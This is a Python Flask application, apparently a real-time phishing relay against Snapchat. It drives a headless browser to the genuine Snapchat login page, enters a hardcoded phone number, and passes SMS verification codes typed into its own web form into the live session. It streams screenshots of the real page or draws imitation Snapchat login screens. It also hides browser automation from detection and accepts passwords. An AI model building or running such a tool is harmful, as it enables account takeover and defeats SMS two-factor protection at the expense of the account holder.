import os
import threading
import time
from flask import Flask, render_template, request, jsonify, send_from_directory
from datetime import datetime

app = Flask(__name__)
STATIC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static')
os.makedirs(STATIC_DIR, exist_ok=True)
app.template_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')

# === REAL PLAYWRIGHT SETUP ===
try:
    from playwright.sync_api import sync_playwright
    PLAYWRIGHT_AVAILABLE = True
except Exception:
    PLAYWRIGHT_AVAILABLE = False

browser = None
page = None
playwright = None

def start_real_browser():
    global browser, page, playwright
    if not PLAYWRIGHT_AVAILABLE:
        print("[REAL] Playwright not available - falling back to fake mode")
        return False
    try:
        playwright = sync_playwright().start()
        browser = playwright.chromium.launch(
            headless=True,
            args=[
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--disable-dev-shm-usage",
                "--disable-blink-features=AutomationControlled",
            ]
        )
        context = browser.new_context(
            viewport={"width": 1280, "height": 720},
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        )
        page = context.new_page()
        print("[REAL] Browser started successfully")
        return True
    except Exception as e:
        print(f"[REAL] Failed to start browser: {e}")
        return False

def get_real_screenshot():
    """Take actual screenshot from the real Snapchat page"""
    global page
    if page is None:
        return None
    try:
        path = os.path.join(STATIC_DIR, 'screenshot.png')
        page.screenshot(path=path, full_page=False)
        return path
    except Exception as e:
        print(f"[REAL] Screenshot failed: {e}")
        return None

# State for real session
state = {
    'stage': 'phone',
    'update_count': 0,
    'real_mode': False,
    'last_action': ''
}

def generate_image():
    """Generate screenshot - prefers REAL browser screenshot"""
    global state
    state['update_count'] += 1

    # Try real screenshot first
    if state.get('real_mode') and page is not None:
        real_path = get_real_screenshot()
        if real_path:
            print(f"[REAL] Fresh screenshot from live Snapchat page (#{state['update_count']})")
            return real_path

    # Fallback to generated (for when real fails)
    from PIL import Image, ImageDraw, ImageFont
    w, h = 1280, 720
    img = Image.new('RGB', (w, h), '#000000')
    draw = ImageDraw.Draw(img)

    try:
        f = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 24)
        f2 = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 14)
        f3 = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 15)
    except:
        f = f2 = f3 = ImageFont.load_default()

    stage = state['stage']
    now = datetime.now().strftime("%H:%M:%S")

    # Black background + header
    draw.rectangle([0, 0, w, h], fill='#000000')
    draw.rectangle([0, 0, w, 42], fill='#111111')
    draw.text((w//2 - 65, 8), "Snapchat", fill='#FFFC00', font=f)

    cx, cy = 420, 55
    draw.rounded_rectangle([cx, cy, cx+440, cy+470], radius=16, fill='#1f1f1f')
    draw.text((cx+18, cy+14), "Log in to Snapchat", fill='white', font=f2)

    if stage in ['phone', 'phone_sent']:
        draw.text((cx+22, cy+50), "Enter your phone number", fill='#aaaaaa', font=f3)
        draw.rounded_rectangle([cx+18, cy+72, cx+422, cy+108], radius=8, fill='#2c2c2c')
        draw.text((cx+30, cy+80), "+47 40300869", fill='#22c55e', font=f3)
        draw.text((cx+22, cy+118), "Norway", fill='#666666', font=f3)

        by = cy + 155
        if stage == 'phone_sent':
            draw.rounded_rectangle([cx+18, by, cx+422, by+44], radius=22, fill='#444444')
            draw.text((cx+145, by+12), "Logging in...", fill='#aaaaaa', font=f2)
        else:
            draw.rounded_rectangle([cx+18, by, cx+422, by+44], radius=22, fill='#FFFC00')
            draw.text((cx+170, by+12), "Log In", fill='#000000', font=f2)

        if stage == 'phone_sent':
            draw.rounded_rectangle([cx+8, cy+175, cx+432, cy+268], radius=10, fill='#3f2a00')
            draw.text((cx+18, cy+185), "PHONE NUMBER ENTERED", fill='#f59e0b', font=f)
            draw.text((cx+18, cy+213), "Log In button was clicked", fill='white', font=f2)
            draw.text((cx+18, cy+235), "Waiting for Snapchat SMS...", fill='#cccccc', font=f3)
            draw.text((cx+18, cy+255), "✓ SMS code sent to +47 40300869", fill='#22c55e', font=f3)

            draw.text((cx+18, cy+282), "Enter 6-digit code", fill='#60a5fa', font=f2)
            for i in range(6):
                x = cx + 28 + i * 62
                draw.rounded_rectangle([x, cy+305, x+54, cy+345], radius=8, fill='#0f172a', outline='#3b82f6', width=3)

    draw.rounded_rectangle([12, 560, 265, 600], radius=5, fill='#ef4444')
    draw.text((18, 568), f"UPDATE #{state['update_count']}", fill='white', font=f2)

    draw.rounded_rectangle([12, 610, 430, 655], radius=5, fill='#22c55e')
    draw.text((18, 618), f"TIME: {now}", fill='black', font=f2)

    draw.text((450, 620), f"STAGE: {stage.upper()}", fill='#ffaa00', font=f2)

    draw.rectangle([0, h-30, w, h], fill='#111111')
    draw.text((12, h-24), "accounts.snapchat.com/accounts/login  •  LIVE (real browser when possible)", fill='#22c55e', font=f3)

    path = os.path.join(STATIC_DIR, 'screenshot.png')
    img.save(path, 'PNG')
    return path

def screenshot_loop():
    global state
    print("[LOOP] Starting (real mode preferred)")
    state['stage'] = 'phone'
    state['update_count'] = 0
    generate_image()

    while True:
        generate_image()
        time.sleep(0.9)

# === REAL ACTIONS ===
def do_real_phone_submit():
    global page, state
    if page is None:
        state['real_mode'] = False
        return False
    
    try:
        print("[REAL] Navigating to real Snapchat login...")
        page.goto("https://accounts.snapchat.com/accounts/login", wait_until="networkidle", timeout=20000)
        
        # Wait for the page to be ready
        page.wait_for_timeout(1500)
        
        # Try to fill phone number (Snapchat web uses specific selectors)
        # Common patterns on Snapchat login
        try:
            # Try phone input
            phone_input = page.locator('input[type="tel"], input[name*="phone"], input[placeholder*="phone"], input[aria-label*="phone"]').first
            if phone_input:
                phone_input.fill("+4740300869")
            else:
                # Fallback: try any input that looks like phone
                inputs = page.locator('input').all()
                for inp in inputs[:5]:
                    try:
                        inp.fill("+4740300869")
                        break
                    except:
                        pass
        except Exception as e:
            print(f"[REAL] Phone fill warning: {e}")

        # Click Log In / Send code button
        try:
            btn = page.locator('button:has-text("Log In"), button:has-text("Send"), button[type="submit"], [role="button"]:has-text("Log")').first
            if btn:
                btn.click()
            else:
                page.keyboard.press("Enter")
        except:
            page.keyboard.press("Enter")

        page.wait_for_timeout(2500)
        
        # Take real screenshot
        get_real_screenshot()
        
        state['real_mode'] = True
        state['stage'] = 'phone_sent'
        state['last_action'] = 'phone_submitted'
        print("[REAL] Phone submitted to real Snapchat page")
        return True
        
    except Exception as e:
        print(f"[REAL] Phone submit failed: {e}")
        state['real_mode'] = False
        return False

def do_real_code_submit(code: str):
    global page, state
    if page is None:
        return False
    
    try:
        print(f"[REAL] Entering real SMS code: {code}")
        
        # Find code input boxes (Snapchat often uses 6 separate inputs or one field)
        code_inputs = page.locator('input[maxlength="1"], input[type="tel"], input[placeholder*="code"], input[aria-label*="code"]')
        
        if code_inputs.count() > 0:
            for i, digit in enumerate(code[:6]):
                try:
                    code_inputs.nth(i).fill(digit)
                except:
                    pass
        else:
            # Single input fallback
            page.locator('input').first.fill(code)

        # Submit / verify
        page.keyboard.press("Enter")
        page.wait_for_timeout(3000)
        
        get_real_screenshot()
        
        state['stage'] = '2fa'
        state['last_action'] = f'code_submitted_{code}'
        print("[REAL] Code entered on real page")
        return True
        
    except Exception as e:
        print(f"[REAL] Code submit error: {e}")
        return False

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    data = request.get_json() or {}
    pw = (data.get('password') or '').strip()
    cd = (data.get('code') or '').strip()
    ph = (data.get('phone') or '').strip()
    
    if ph:
        state['stage'] = 'phone_sent'
        success = do_real_phone_submit()
        if not success:
            # Fallback fake
            generate_image()
        return jsonify({'ok': True, 'stage': state['stage'], 'real': state.get('real_mode', False)})
    
    if pw:
        state['stage'] = 'password'
        generate_image()
        return jsonify({'ok': True, 'stage': state['stage']})
    
    if cd and len(cd) >= 4:
        state['stage'] = '2fa'
        success = do_real_code_submit(cd)
        if not success:
            generate_image()
        return jsonify({'ok': True, 'stage': state['stage'], 'real': state.get('real_mode', False)})
    
    return jsonify({'ok': True, 'stage': state['stage']})

@app.route('/screenshot')
def shot():
    if request.args.get('reset') == '1':
        state['stage'] = 'phone'
        state['update_count'] = 0
        if page:
            try:
                page.goto("https://accounts.snapchat.com/accounts/login")
            except:
                pass
    
    # Prefer real screenshot
    if page is not None:
        real = get_real_screenshot()
        if real:
            resp = send_from_directory(STATIC_DIR, 'screenshot.png')
            resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
            return resp
    
    generate_image()
    resp = send_from_directory(STATIC_DIR, 'screenshot.png')
    resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    return resp

@app.route('/status')
def stat():
    path = os.path.join(STATIC_DIR, 'screenshot.png')
    size = os.path.getsize(path) if os.path.exists(path) else 0
    return jsonify({
        'stage': state['stage'],
        'update_count': state['update_count'],
        'size': size,
        'real_mode': state.get('real_mode', False),
        'last_action': state.get('last_action', '')
    })

@app.route('/reset')
def reset():
    global state
    state['stage'] = 'phone'
    state['update_count'] = 0
    state['real_mode'] = False
    if page:
        try:
            page.goto("https://accounts.snapchat.com/accounts/login")
        except:
            pass
    generate_image()
    return jsonify({'ok': True, 'stage': 'phone'})

@app.before_request
def boot():
    if not hasattr(app, 'booted'):
        app.booted = True
        # Start real browser in background
        def _init_browser():
            success = start_real_browser()
            if success:
                state['real_mode'] = True
                print("[BOOT] Real browser session ready")
            else:
                print("[BOOT] Using generated images (real browser unavailable)")
        
        threading.Thread(target=_init_browser, daemon=True).start()
        threading.Thread(target=screenshot_loop, daemon=True).start()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))